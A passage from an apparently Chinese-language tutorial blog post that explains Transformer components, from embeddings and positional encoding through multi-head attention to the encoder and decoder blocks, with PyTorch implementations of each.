vocab_size: 词汇表大小（如10000）</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.d_model = d_model</span><br><span class="line">        <span class="variable language_">self</span>.vocab_size = vocab_size</span><br><span class="line">        <span class="variable language_">self</span>.embedding = nn.Embedding(vocab_size, d_model)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        前向传播</span></span><br><span class="line"><span class="string">        输入: (batch, seq_len) - token IDs</span></span><br><span class="line"><span class="string">        输出: (batch, seq_len, d_model) - 嵌入向量</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.embedding(x) * math.sqrt(<span class="variable language_">self</span>.d_model)</span><br></pre></td></tr></table></figure>

<h3 id="位置编码（Positional-Encoding）"><a href="#位置编码（Positional-Encoding）" class="headerlink" title="位置编码（Positional Encoding）"></a>位置编码（Positional Encoding）</h3><p><strong>为什么需要位置编码</strong></p>
<p>Transformer的注意力机制本身是位置无关的（permutation invariant），无法区分”I ate an apple”和”An apple ate me”这类语序不同的句子。因此需要显式地为模型注入位置信息。</p>
<p><strong>实现方式</strong></p>
<p>使用预定义的数学公式生成位置编码，而非可学习参数：</p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/aa74f29784f5c9263d0d71c0bca2975.png" alt="位置编码公式"></p>
<p>其中：</p>
<ul>
<li>pos：单词在序列中的位置（0-based索引）</li>
<li>i：维度索引（0 ≤ i &lt; d_model&#x2F;2）</li>
<li>偶数维度使用正弦函数，奇数维度使用余弦函数</li>
</ul>
<p><strong>融合方式</strong></p>
<p>位置编码与词嵌入<strong>逐元素相加</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最终表示 = 词嵌入 + 位置编码</span><br></pre></td></tr></table></figure>

<p><strong>关键特性</strong></p>
<ul>
<li><strong>相对位置感知</strong>：正弦&#x2F;余弦函数的周期性使模型能捕捉相对位置关系</li>
<li><strong>可扩展性</strong>：允许处理比训练时更长的序列</li>
<li><strong>数值平衡</strong>：确保位置编码值域与词嵌入值域相匹配</li>
</ul>
<p><strong>可视化示例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 假设 d_model=4, seq_len=3</span></span><br><span class="line">词嵌入 = [[<span class="number">0.2</span>, <span class="number">1.1</span>, -<span class="number">0.5</span>, <span class="number">0.8</span>],   <span class="comment"># &quot;Hello&quot;</span></span><br><span class="line">         [<span class="number">0.7</span>, -<span class="number">0.3</span>, <span class="number">1.2</span>, <span class="number">0.4</span>],   <span class="comment"># &quot;World&quot;</span></span><br><span class="line">         [<span class="number">0.9</span>, <span class="number">0.5</span>, -<span class="number">0.1</span>, <span class="number">1.0</span>]]   <span class="comment"># &quot;!&quot;</span></span><br><span class="line"></span><br><span class="line">位置编码 = [[<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">1.0</span>],     <span class="comment"># 位置0</span></span><br><span class="line">          [<span class="number">0.84</span>, <span class="number">0.54</span>, <span class="number">0.002</span>, <span class="number">1.0</span>],  <span class="comment"># 位置1</span></span><br><span class="line">          [<span class="number">0.91</span>, -<span class="number">0.42</span>, <span class="number">0.003</span>, <span class="number">0.99</span>]] <span class="comment"># 位置2</span></span><br><span class="line"></span><br><span class="line">最终表示 = 词嵌入 + 位置编码</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PositionalEncoding</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;位置编码层（基于Attention is All You Need论文3.5节）&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, d_model: <span class="built_in">int</span>, seq_len: <span class="built_in">int</span>, dropout: <span class="built_in">float</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            d_model: 模型维度（必须与词嵌入维度相同）</span></span><br><span class="line"><span class="string">            seq_len: 预设的最大序列长度</span></span><br><span class="line"><span class="string">            dropout: dropout概率</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.d_model = d_model</span><br><span class="line">        <span class="variable language_">self</span>.seq_len = seq_len</span><br><span class="line">        <span class="variable language_">self</span>.dropout = nn.Dropout(dropout)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 预计算位置编码矩阵 (seq_len, d_model)</span></span><br><span class="line">        pe = torch.zeros(seq_len, d_model)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 生成位置索引 [0, 1, 2, ..., seq_len-1]</span></span><br><span class="line">        position = torch.arange(<span class="number">0</span>, seq_len, dtype=torch.<span class="built_in">float</span>).unsqueeze(<span class="number">1</span>)  <span class="comment"># (seq_len, 1)</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算频率项分母（对数空间计算，数值更稳定）</span></span><br><span class="line">        div_term = torch.exp(torch.arange(<span class="number">0</span>, d_model, <span class="number">2</span>).<span class="built_in">float</span>() * (-math.log(<span class="number">10000.0</span>) / d_model))</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># 偶数维度使用正弦，奇数维度使用余弦</span></span><br><span class="line">        pe[:, <span class="number">0</span>::<span class="number">2</span>] = torch.sin(position * div_term)</span><br><span class="line">        pe[:, <span class="number">1</span>::<span class="number">2</span>] = torch.cos(position * div_term)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 添加batch维度 (1, seq_len, d_model)</span></span><br><span class="line">        pe = pe.unsqueeze(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 注册为buffer（随模型保存但不参与梯度计算）</span></span><br><span class="line">        <span class="variable language_">self</span>.register_buffer(<span class="string">&#x27;pe&#x27;</span>, pe)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        前向传播</span></span><br><span class="line"><span class="string">        输入/输出: (batch_size, seq_len, d_model)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 截取与输入长度匹配的位置编码并相加</span></span><br><span class="line">        x = x + (<span class="variable language_">self</span>.pe[:, :x.shape[<span class="number">1</span>], :]).requires_grad_(<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.dropout(x)</span><br></pre></td></tr></table></figure>

<h3 id="层归一化（Layer-Normalization）"><a href="#层归一化（Layer-Normalization）" class="headerlink" title="层归一化（Layer Normalization）"></a>层归一化（Layer Normalization）</h3><p><strong>核心原理</strong></p>
<p>层归一化对每个样本独立进行标准化处理，分为三步：</p>
<ol>
<li><strong>计算统计量</strong>：为每个样本单独计算所有特征的均值和方差</li>
<li><strong>标准化</strong>：将特征值转换为均值为0、方差为1的标准分布</li>
<li><strong>可学习变换</strong>：通过gamma（缩放）和beta（偏移）参数调整输出</li>
</ol>
<p><strong>关键特性</strong></p>
<ul>
<li>处理不同长度文本时更稳定</li>
<li>与Transformer的残差连接配合良好</li>
<li>训练和推理时行为一致（不依赖batch统计量）</li>
</ul>
<p><strong>数值稳定性</strong></p>
<p>使用epsilon（ε &#x3D; 10⁻⁶）避免除零错误，确保计算稳定性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LayerNormalization</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;层归一化（参考论文《Layer Normalization》）&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, features: <span class="built_in">int</span>, eps: <span class="built_in">float</span>=<span class="number">10</span>**-<span class="number">6</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            features: 输入特征维度（对应d_model）</span></span><br><span class="line"><span class="string">            eps: 防止除零的小常数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.eps = eps</span><br><span class="line">        <span class="variable language_">self</span>.alpha = nn.Parameter(torch.ones(features))   <span class="comment"># 缩放参数γ</span></span><br><span class="line">        <span class="variable language_">self</span>.bias = nn.Parameter(torch.zeros(features))   <span class="comment"># 偏移参数β</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        前向传播: (x-μ)/σ * α + β</span></span><br><span class="line"><span class="string">        输入/输出: (batch_size, seq_len, features)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        mean = x.mean(dim=-<span class="number">1</span>, keepdim=<span class="literal">True</span>)</span><br><span class="line">        std = x.std(dim=-<span class="number">1</span>, keepdim=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.alpha * (x - mean) / (std + <span class="variable language_">self</span>.eps) + <span class="variable language_">self</span>.bias</span><br></pre></td></tr></table></figure>

<h3 id="前馈神经网络（Feed-Forward-Network）"><a href="#前馈神经网络（Feed-Forward-Network）" class="headerlink" title="前馈神经网络（Feed Forward Network）"></a>前馈神经网络（Feed Forward Network）</h3><p><strong>结构说明</strong></p>
<p>前馈网络由两个线性层组成，中间使用ReLU激活函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FFN(x) = ReLU(xW₁ + b₁)W₂ + b₂</span><br></pre></td></tr></table></figure>

<p><strong>维度变换</strong></p>
<ul>
<li>第一层：d_model → d_ff（扩展，通常d_ff &#x3D; 4 × d_model）</li>
<li>第二层：d_ff → d_model（压缩回原维度）</li>
</ul>
<p>论文中使用 d_model&#x3D;512，d_ff&#x3D;2048。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FeedForwardBlock</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;前馈神经网络块&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, d_model: <span class="built_in">int</span>, d_ff: <span class="built_in">int</span>, dropout: <span class="built_in">float</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            d_model: 模型维度（输入输出维度）</span></span><br><span class="line"><span class="string">            d_ff: 中间层扩展维度（通常为d_model的4倍）</span></span><br><span class="line"><span class="string">            dropout: 随机失活概率</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.linear_1 = nn.Linear(d_model, d_ff)</span><br><span class="line">        <span class="variable language_">self</span>.dropout = nn.Dropout(dropout)</span><br><span class="line">        <span class="variable language_">self</span>.linear_2 = nn.Linear(d_ff, d_model)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        前向传播: (batch, seq_len, d_model) → (batch, seq_len, d_ff) → (batch, seq_len, d_model)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.linear_2(<span class="variable language_">self</span>.dropout(torch.relu(<span class="variable language_">self</span>.linear_1(x))))</span><br></pre></td></tr></table></figure>

<h3 id="多头注意力机制（Multi-Head-Attention）"><a href="#多头注意力机制（Multi-Head-Attention）" class="headerlink" title="多头注意力机制（Multi-Head Attention）"></a>多头注意力机制（Multi-Head Attention）</h3><p><strong>工作原理</strong></p>
<p>多头注意力机制将输入通过三个线性变换生成Q（查询）、K（键）、V（值）矩阵，然后：</p>
<ol>
<li><strong>线性投影</strong>：输入通过W_Q、W_K、W_V三个权重矩阵生成Q、K、V</li>
<li><strong>分头</strong>：将Q、K、V沿特征维度切分为h个头（如512维切分为8个64维的头）</li>
<li><strong>并行注意力</strong>：每个头独立计算缩放点积注意力</li>
<li><strong>合并</strong>：拼接所有头的输出，通过W_O线性层融合</li>
</ol>
<p><strong>核心流程</strong></p>
<p><img src="/2025/03/28/Transformer%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/0510cc4123db8b450b53476b04afb66.png" alt="多头注意力流程图"></p>
<p><strong>分头策略</strong></p>
<ul>
<li>沿<strong>特征维度</strong>而非序列维度切分</li>
<li>每个头访问完整句子，但只看到嵌入的不同部分</li>
<li>例如：d_model&#x3D;512, h&#x3D;8 → 每个头的维度d_k&#x3D;64</li>
</ul>
<p><strong>关键特性</strong></p>
<ul>
<li>多头设计使模型同时关注不同语义关系（语法&#x2F;语义&#x2F;指代等）</li>
<li>输入输出维度一致（都是d_model），便于堆叠</li>
<li>编码器中Q&#x3D;K&#x3D;V（自注意力），解码器中K、V来自编码器（交叉注意力）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MultiHeadAttentionBlock</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;多头注意力机制（论文3.2.2节）&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, d_model: <span class="built_in">int</span>, h: <span class="built_in">int</span>, dropout: <span class="built_in">float</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            d_model: 模型维度（必须能被h整除）</span></span><br><span class="line"><span class="string">            h: 注意力头数量</span></span><br><span class="line"><span class="string">            dropout: dropout概率</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.d_model = d_model</span><br><span class="line">        <span class="variable language_">self</span>.h = h</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确保d_model能被h整除</span></span><br><span class="line">        <span class="keyword">assert</span> d_model % h == <span class="number">0</span>, <span class="string">&quot;d_model必须能被h整除&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.d_k = d_model // h  <span class="comment"># 每个头的维度</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment"># 定义Q、K、V和输出的线性变换</span></span><br><span class="line">        <span class="variable language_">self</span>.w_q = nn.Linear(d_model, d_model, bias=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.w_k = nn.Linear(d_model, d_model, bias=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.w_v = nn.Linear(d_model, d_model, bias=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.w_o = nn.Linear(d_model, d_model, bias=<span class="literal">False</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.dropout = nn.Dropout(dropout)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">attention</span>(<span class="params">query, key, value, mask, dropout: nn.Dropout</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        计算缩放点积注意力（论文3.2.1节）</span></span><br><span class="line"><span class="string">        返回: (注意力输出, 注意力权重)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        d_k = query.shape[-<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算注意力分数: Q·K^T / √d_k</span></span><br><span class="line">        attention_scores = (query @ key.transpose(-<span class="number">2</span>, -<span class="number">1</span>)) / math.sqrt(d_k)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 应用掩码（将无效位置设为极小值）</span></span><br><span class="line">        <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            attention_scores.masked_fill_(mask == <span class="number">0</span>, -<span class="number">1e9</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Softmax归一化</span></span><br><span class="line">        attention_scores = attention_scores.softmax(dim=-<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 应用dropout</span></span><br><span class="line">        <span class="keyword">if</span> dropout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            attention_scores = dropout(attention_scores)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 注意力加权求和</span></span><br><span class="line">        <span class="keyword">return</span> (attention_scores @ value), attention_scores</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, q, k, v, mask</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        前向传播</span></span><br><span class="line"><span class="string">        输入/输出: (batch_size, seq_len, d_model)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 线性投影</span></span><br><span class="line">        query = <span class="variable language_">self</span>.w_q(q)  <span class="comment"># (batch, seq_len, d_model)</span></span><br><span class="line">        key = <span class="variable language_">self</span>.w_k(k)</span><br><span class="line">        value = <span class="variable language_">self</span>.w_v(v)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分头: (batch, seq_len, d_model) → (batch, h, seq_len, d_k)</span></span><br><span class="line">        query = query.view(query.shape[<span class="number">0</span>], query.shape[<span class="number">1</span>], <span class="variable language_">self</span>.h, <span class="variable language_">self</span>.d_k).transpose(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">        key = key.view(key.shape[<span class="number">0</span>], key.shape[<span class="number">1</span>], <span class="variable language_">self</span>.h, <span class="variable language_">self</span>.d_k).transpose(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">        value = value.view(value.shape[<span class="number">0</span>], value.shape[<span class="number">1</span>], <span class="variable language_">self</span>.h, <span class="variable language_">self</span>.d_k).transpose(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算注意力</span></span><br><span class="line">        x, <span class="variable language_">self</span>.attention_scores = MultiHeadAttentionBlock.attention(query, key, value, mask, <span class="variable language_">self</span>.dropout)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 合并头: (batch, h, seq_len, d_k) → (batch, seq_len, d_model)</span></span><br><span class="line">        x = x.transpose(<span class="number">1</span>, <span class="number">2</span>).contiguous().view(x.shape[<span class="number">0</span>], -<span class="number">1</span>, <span class="variable language_">self</span>.h * <span class="variable language_">self</span>.d_k)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 最终线性变换</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.w_o(x)</span><br></pre></td></tr></table></figure>

<p><strong>掩码机制说明</strong></p>
<p>掩码用于控制注意力的可见范围：</p>
<ul>
<li>在Softmax之前将不希望关注的位置设为-∞（实际使用-1e9）</li>
<li>Softmax后这些位置的权重接近0</li>
<li>用途：隐藏padding token、防止解码器看到未来信息</li>
</ul>
<h3 id="残差连接（Residual-Connection）"><a href="#残差连接（Residual-Connection）" class="headerlink" title="残差连接（Residual Connection）"></a>残差连接（Residual Connection）</h3><p><strong>功能说明</strong></p>
<p>残差连接（也称跳跃连接）将子层的输入直接加到输出上，缓解深层网络的梯度消失问题。</p>
<p><strong>实现细节</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出 = LayerNorm(输入) → 子层 → Dropout → + 输入</span><br></pre></td></tr></table></figure>

<p>注意：这里采用Pre-LN结构（先归一化再计算），与原论文的Post-LN略有不同，但训练更稳定。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ResidualConnection</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;残差连接 + 层归一化 + Dropout&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, features: <span class="built_in">int</span>, dropout: <span class="built_in">float</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.dropout = nn.Dropout(dropout)</span><br><span class="line">        <span class="variable language_">self</span>.norm = LayerNormalization(features)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, sublayer</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            x: 输入</span></span><br><span class="line"><span class="string">            sublayer: 子层函数（如注意力层或前馈层）</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> x + <span class="variable language_">self</span>.dropout(sublayer(<span class="variable language_">self</span>.norm(x)))</span><br></pre></td></tr></table></figure>

<h3 id="编码器块（Encoder-Block）"><a href="#编码器块（Encoder-Block）" class="headerlink" title="编码器块（Encoder Block）"></a>编码器块（Encoder Block）</h3><p><strong>结构组成</strong></p>
<p>每个编码器块包含两个子层：</p>
<ol>
<li>多头自注意力 + 残差连接 + 层归一化</li>
<li>前馈网络 + 残差连接 + 层归一化</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EncoderBlock</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;单个编码器层&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, features: <span class="built_in">int</span>, self_attention_block: MultiHeadAttentionBlock, </span></span><br><span class="line"><span class="params">                 feed_forward_block: FeedForwardBlock, dropout: <span class="built_in">float</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.self_attention_block = self_attention_block</span><br><span class="line">        <span class="variable language_">self</span>.feed_forward_block = feed_forward_block</span><br><span class="line">        <span class="variable language_">self</span>.residual_connections = nn.ModuleList([ResidualConnection(features, dropout) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, src_mask</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        前向传播</span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            x: 输入 (batch, seq_len, d_model)</span></span><br><span class="line"><span class="string">            src_mask: 源序列掩码（隐藏padding）</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 自注意力子层（Q=K=V=x）</span></span><br><span class="line">        x = <span class="variable language_">self</span>.residual_connections[<span class="number">0</span>](x, <span class="keyword">lambda</span> x: <span class="variable language_">self</span>.self_attention_block(x, x, x, src_mask))</span><br><span class="line">        <span class="comment"># 前馈子层</span></span><br><span class="line">        x = <span class="variable language_">self</span>.residual_connections[<span class="number">1</span>](x, <span class="variable language_">self</span>.feed_forward_block)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>

<h3 id="完整编码器（Encoder）"><a href="#完整编码器（Encoder）" class="headerlink" title="完整编码器（Encoder）"></a>完整编码器（Encoder）</h3><p><strong>多层堆叠</strong></p>
<p>将N个编码器块堆叠，前一层的输出作为下一层的输入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Encoder</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;完整编码器（N层编码器块堆叠）&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, features: <span class="built_in">int</span>, layers: nn.ModuleList</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.layers = layers</span><br><span class="line">        <span class="variable language_">self</span>.norm = LayerNormalization(features)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, mask</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;逐层处理输入&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> <span class="variable language_">self</span>.layers:</span><br><span class="line">            x = layer(x, mask)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.norm(x)</span><br></pre></td></tr></table></figure>

<h3 id="解码器块（Decoder-Block）"><a href="#解码器块（Decoder-Block）" class="headerlink" title="解码器块（Decoder Block）"></a>解码器块（Decoder Block）</h3><p><strong>结构组成</strong></p>
<p>解码器块包含三个子层（比编码器多一个交叉注意力层）：</p>
<ol>
<li><strong>掩码自注意力</strong>：Q&#x3D;K&#x3D;V来自解码器自身，使用目标掩码</li>
<li><strong>交叉注意力</strong>：Q来自解码器，K和V来自编码器输出</li>
<li><strong>前馈网络</strong>：与编码器相同的结构</li>
</ol>
<p><strong>自注意力 vs 交叉注意力</strong></p>
<ul>
<li><strong>自注意力</strong>：同一句子内的词相互关注（Q&#x3D;K&#x3D;V）</li>
<li><strong>交叉注意力</strong>：解码器关注编码器的输出（Q≠K,V）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DecoderBlock</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;单个解码器层&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, features: <span class="built_in">int</span>, self_attention_block: MultiHeadAttentionBlock, </span></span><br><span class="line"><span class="params">                 cross_attention_block: MultiHeadAttentionBlock, </span></span><br><span class="line"><span class="params">                 feed_forward_block: FeedForwardBlock, dropout: <span class="built_in">float</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.self_attention_block = self_attention_block</span><br><span class="line">        <span class="variable language_">self</span>.cross_attention_block = cross_attention_block</span><br><span class="line">        <span class="variable language_">self</span>.feed_forward_block = feed_forward_block</span><br><span class="line">        <span class="variable language_">self</span>.residual_connections = nn.ModuleList([ResidualConnection(features, dropout) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, encoder_output, src_mask, tgt_mask</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        前向传播</span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            x: 解码器输入</span></span><br><span class="line"><span class="string">            encoder_output: 编码器输出</span></span><br><span class="line"><span class="string">            src_mask: 源序列掩码</span></span><br><span class="line"><span class="string">            tgt_mask: 目标序列掩码（因果掩码）</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 掩码自注意力（Q=K=V=x）</span></span><br><span class="line">        x = <span class="variable language_">self</span>.residual_connections[<span class="number">0</span>](x, <span class="keyword">lambda</span> x: <span class="variable language_">self</span>.self_attention_block(x, x, x, tgt_mask))</span><br><span class="line">        <span class="comment"># 交叉注意力（Q=x, K=V=encoder_output）</span></span><br><span class="line">        x = <span class="variable language_">self</span>.residual_connections[<span class="number">1</span>](x, <span class="keyword">lambda</span> x: <span class="variable language_">self</span>.cross_attention_block(x, encoder_output, encoder_output, src_mask))</span><br><span class="line">        <span class="comment"># 前馈网络</span></span><br><span class="line">        x = <span class="variable language_">self</span>.residual_connections[<span class="number">2</span>](x, <span class="variable language_">self</span>.feed_forward_block)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>

